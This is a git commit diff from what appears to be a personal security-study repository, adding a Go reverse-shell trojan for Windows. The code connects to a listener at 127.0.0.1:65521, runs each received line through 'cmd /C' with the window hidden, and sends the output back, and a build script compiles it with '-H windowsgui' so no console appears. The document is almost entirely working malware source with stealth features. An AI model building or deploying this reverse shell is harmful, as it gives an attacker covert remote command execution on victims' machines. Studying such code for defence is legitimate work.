c8abec58e5f299850f8bf0829f06b59caa8255d6
233PC <ayusummer233@gmail.com>
2024-04-21 18:27:52 +0800

    反弹shell-Go+CMD

---
+++ Security/EndPoint/Trojan/Go/ReverseShell/build.ps1
@@ -0,0 +1,4 @@
+# 正常编译, 运行后会弹出一个cmd窗口
+go build -o normal.exe
+# 隐藏窗口编译, 运行后不会弹出cmd窗口
+go build -ldflags="-H windowsgui" -o hide_window.exe
--- Security/EndPoint/Trojan/Go/ReverseShell/main.go
+++ Security/EndPoint/Trojan/Go/ReverseShell/main.go
@@ -7,22 +7,31 @@ import (
 	"net"
 	"os/exec"
 	"strings"
+	"syscall"
 )
 
 func main() {
-	conn, err := net.Dial("tcp", "127.0.0.1:4444")
+	conn, err := net.Dial("tcp", "127.0.0.1:65521")
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
-		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+		cmd := exec.Command("cmd", "/C", strings.TrimSuffix(message, "\n"))
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, err := cmd.Output()
 
 		if err != nil {
 			fmt.Fprintf(conn, "%s\n", err)
 		}
 		fmt.Fprintf(conn, "%s\n", outputToString(out))
+
+		// 收到 exit 命令或者 Ctrl+C(空)，关闭连接
+		if strings.TrimSuffix(message, "\n") == "exit" || message == "" {
+			conn.Close()
+			return
+		}
 	}
 }
 
